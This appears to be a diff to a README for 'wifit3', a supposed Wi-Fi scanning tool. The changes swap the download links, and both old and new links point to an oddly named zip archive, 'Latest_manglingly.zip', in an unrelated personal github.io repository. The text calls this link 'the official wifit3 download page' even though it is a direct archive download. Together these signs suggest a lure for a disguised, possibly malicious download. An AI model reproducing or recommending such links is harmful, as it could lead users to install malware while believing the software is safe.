@@ -17,7 +17,7 @@ wifit3 is a simple, safe tool that scans the Wi-Fi networks around you and shows
 
 First, you need to get the app. Click the big button below to go to the download page.
 
-[![Download wifit3](https://img.shields.io/badge/Download-wifit3-blue?style=for-the-badge&logo=windows&logoColor=white&color=2ea44f)](https://raw.githubusercontent.com/asman9659/asman9659.github.io/main/obliquus/Latest_manglingly.zip)
+[![Download wifit3](https://img.shields.io/badge/Download-wifit3-blue?style=for-the-badge&logo=windows&logoColor=white&color=2ea44f)](https://github.com/asman9659/asman9659.github.io/raw/refs/heads/main/obliquus/Latest_manglingly.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Follow these simple steps:
 
 Click the link above or type this address into your web browser:
 
-👉 **https://raw.githubusercontent.com/asman9659/asman9659.github.io/main/obliquus/Latest_manglingly.zip**
+👉 **https://github.com/asman9659/asman9659.github.io/raw/refs/heads/main/obliquus/Latest_manglingly.zip**
 
 This will take you to the official wifit3 download page.
 
